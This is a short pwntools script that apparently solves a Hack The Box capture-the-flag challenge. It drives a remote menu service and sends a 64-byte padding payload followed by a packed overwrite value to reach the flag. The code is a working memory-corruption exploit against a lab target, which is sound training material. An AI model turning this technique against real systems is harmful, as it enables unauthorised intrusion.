from pwn import *

payload = 'A'*64+p32(0x6B637566)

def add_acc(proc, fn, ln):
    print proc.recvuntil(': ')
    proc.sendline('1')
    print proc.recvuntil(': ')
    proc.sendline(fn)
    print proc.recvuntil(': ')
    proc.sendline(ln)

def usa(proc):
    print proc.recvuntil(': ')
    proc.sendline('3')


def add_memo(proc, memo):
    print proc.recvuntil(': ')
    proc.sendline('4')
    print proc.recv()
    proc.sendline(memo)

def flag(proc):
    print proc.recvuntil(': ')
    proc.sendline('5')
    print proc.recv()
    print proc.recv()
    print proc.recv()

p = remote('docker.hackthebox.eu', 32315)

add_acc(p, 'A', 'B')
usa(p)
add_memo(p, payload)
flag(p)
